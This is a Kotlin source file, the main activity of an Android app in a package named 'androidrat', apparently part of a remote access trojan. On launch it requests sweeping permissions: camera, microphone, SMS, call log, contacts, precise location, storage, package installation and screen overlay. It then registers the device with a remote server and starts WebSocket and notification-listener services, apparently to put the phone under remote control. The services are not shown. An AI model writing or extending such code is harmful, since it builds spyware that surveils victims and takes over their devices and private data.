package com.nqmgaming.androidrat

import android.Manifest
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.ServiceConnection
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.provider.Settings
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.nqmgaming.androidrat.command.DeviceInfo
import com.nqmgaming.androidrat.core.util.MediaProjectionManagerHolder
import com.nqmgaming.androidrat.data.ApiService
import com.nqmgaming.androidrat.data.dto.DeviceDto
import com.nqmgaming.androidrat.service.NotificationListener
import com.nqmgaming.androidrat.service.ScreenshotService
import com.nqmgaming.androidrat.service.WebSocketService
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.WebSocket
import retrofit2.awaitResponse
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    @Inject
    lateinit var apiService: ApiService

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!arePermissionsGranted()) {
            ActivityCompat.requestPermissions(this, APP_PERMISSION, 0)
        }

        sendRegistrationRequest()
        startService(Intent(this, WebSocketService::class.java))
        startService(Intent(this, NotificationListener::class.java))
    }

    // Request to send registration request
    @RequiresApi(Build.VERSION_CODES.M)
    private fun sendRegistrationRequest() {
        val deviceDto = DeviceDto(
            id = Build.ID,
            name = Build.MODEL,
            os = "Android",
            sdk = Build.VERSION.SDK_INT,
        )

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val response = apiService.register(deviceDto)
                response.awaitResponse().let {
                    if (it.isSuccessful) {
                        println("Device registered successfully")
                    } else {
                        println("Failed to register device: ${it.errorBody()?.string()}")
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun arePermissionsGranted(): Boolean {
        return APP_PERMISSION.all { permission ->
            ContextCompat.checkSelfPermission(
                applicationContext,
                permission
            ) == PackageManager.PERMISSION_GRANTED
        }
    }

    companion object {
        val APP_PERMISSION = arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.REQUEST_INSTALL_PACKAGES,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.SYSTEM_ALERT_WINDOW,
            Manifest.permission.ACCESS_WIFI_STATE

        )
    }
}


